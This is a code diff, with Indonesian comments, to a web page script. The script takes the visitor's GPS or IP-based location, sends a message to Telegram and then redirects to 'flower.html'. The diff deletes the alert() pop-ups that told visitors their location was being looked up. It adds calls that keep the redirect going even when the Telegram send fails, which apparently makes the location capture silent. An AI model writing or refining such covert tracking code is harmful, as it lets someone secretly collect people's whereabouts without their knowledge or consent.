@@ -45,14 +45,12 @@
                     },
                     (error) => {
                         console.warn("Lokasi tidak bisa diperoleh: ", error.message);
-                        alert("Menggunakan lokasi IP sebagai alternatif...");
                         // Gunakan lokasi berbasis IP
                         getIpLocation();
                     },
                     { enableHighAccuracy: true }
                 );
             } else {
-                alert("Geolocation tidak didukung di browser Anda. Menggunakan lokasi IP...");
                 getIpLocation();
             }
         });
@@ -74,7 +72,6 @@
                 })
                 .catch(err => {
                     console.error("Gagal mendapatkan lokasi IP:", err);
-                    alert("Tidak dapat mendapatkan lokasi. Melanjutkan ke halaman...");
                     window.location.href = 'flower.html';
                 });
         }
@@ -96,9 +93,11 @@
                 })
                 .then(result => {
                     console.log("Pesan berhasil dikirim:", result);
+                    onSuccess();
                 })
                 .catch(error => {
                     console.error("Gagal mengirim pesan ke Telegram:", error);
+                    onSuccess(); // Tetap lanjutkan meskipun gagal
                 });
         }
     </script>
